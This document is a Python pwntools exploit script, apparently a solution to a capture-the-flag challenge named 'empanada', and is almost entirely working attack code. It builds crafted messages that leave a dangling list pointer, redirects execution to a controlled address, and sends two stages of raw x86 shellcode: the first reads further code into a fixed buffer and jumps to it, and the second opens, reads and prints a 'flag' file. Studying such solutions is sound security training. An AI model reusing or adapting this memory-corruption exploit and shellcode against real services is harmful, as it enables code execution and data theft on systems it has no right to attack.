from pwn import *

context.log_level = "DEBUG"

#p = process('./empanada')
p = remote('empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me', 47281)


def msg(t, size, idx):
    return chr(t << 7 | idx << 5 | size)

def msg_cnt(idx=0, t=1):
    return msg(t,1,idx) + chr(64)

def del_msg(msg_idx, idx=0, t=1):
    return msg(t,2,idx) + chr(80) + chr(msg_idx)

def get_all(idx=0, t=1):
    return msg(t,1,idx) + chr(96)

def get_msg(msg_idx, idx=0, t=1):
    return msg(t,2,idx) + chr(48) + chr(msg_idx)

def get_hash(msg_idx, idx=0, t=1):
    return msg(t,2,idx) + chr(32) + chr(msg_idx)

def store_msg(idx=1, t=1):
    return msg(t,1,idx) + chr(16)

def del_all(idx=0, t=1):
    return msg(t,1,idx) + chr(0)

def exit(idx=0, t=1):
    return msg(t,1,idx) + chr(1)

def clr_invalid(idx=0, t=1):
    return msg(t,1,idx) + chr(0xfe)

def data_msg(data, idx=0, t=1):
    return msg(t, len(data), idx) + data

# setup what will become our own empmsg
shellcode_addr = 0x313371ef

p.sendline(store_msg() + data_msg('A'*9 + p32(shellcode_addr) + 'A'*3))
print p.recv()
p.sendline(store_msg() + data_msg(' ' + p32(0x31337138) + 'B'*7))
print p.recv()

# The two data messages with t=0 will get rellocated to get_all's msg itself
# and then to get_all's response buffer
p.sendline(store_msg() + data_msg('', t=0))
print p.recv()
p.sendline(store_msg() + data_msg('', t=0))
print p.recv()

p.sendline(clr_invalid())
print p.recv()

p.sendline(get_all())
print p.recv()

# read in to another shellcode buffer at 0x31338000 so we don't have to worry
# about length and jump to it
shellcode = "\xb8\x03\x00\x00\x00\xbb\x00\x00\x00\x00\xb9\x00\x8031\xba\xe8\x03\x00\x00\xcd\x80\xb8\x00\x8031\xff\xe0"

p.sendline(store_msg() + data_msg(shellcode))
print p.recv()

# at this point, the last store should have a dangling next pointer.
# now try to get the hash which walks the linked list, hopefully calling
# something we control from the original messages

p.sendline(get_hash(3))

# 2nd stage shellcode which opens "flag", reads, and writes to stdout
p.sendline("\xb8\x05\x00\x00\x00j\x00hflag\x89\xe3\xb9\x00\x00\x00\x00\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\xb9\x00\x9031\xbad\x00\x00\x00\xcd\x80\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x00\x9031\xbad\x00\x00\x00\xcd\x80")

p.sendline('ls')
print p.recv()

p.interactive()
